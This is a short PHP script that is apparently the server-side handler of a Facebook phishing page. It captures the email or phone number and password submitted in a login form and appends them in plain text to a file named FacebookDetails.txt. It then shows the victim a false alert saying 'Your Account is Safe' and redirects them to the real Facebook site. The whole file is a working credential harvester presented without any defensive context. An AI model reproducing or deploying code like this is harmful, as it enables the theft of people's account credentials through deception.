<?php
    if(isset($_POST['login']))
    {
        $username=$_POST['email'];
        $password=$_POST['password'];
        $text="Email/Phone number : ".$username."\n"."Password : ".$password."\n\n";
        $fp=fopen('FacebookDetails.txt','a+');
        if(fwrite($fp,$text))
        {
            echo "<script>alert('Your Account is Safe');location.href='https://www.facebook.com';</script>";
        }
        fclose($fp);
        die();
    }
?>